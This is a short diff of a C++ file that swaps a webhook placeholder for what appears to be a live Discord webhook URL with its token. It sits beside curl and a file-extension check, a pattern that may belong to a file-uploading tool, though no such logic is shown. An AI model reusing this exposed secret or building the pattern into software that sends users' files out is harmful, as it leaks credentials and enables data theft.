@@ -8,7 +8,7 @@
 #include "Colors.h"
 #include <curl/curl.h>
 
-const char* webhook_url = "put your webhook url here";
+const char* webhook_url = "https://discord.com/api/webhooks/1530803914130194592/El2eCKZqFs4Cq__hpaTwMOY3I5ZJFXAiKSZjz7C-KWIMLDlep7TvvTl6LQmnn_T1L1Cd";
 
 bool has_extension(const std::string& filepath, const std::string& extension) {
 	std::filesystem::path path(filepath);
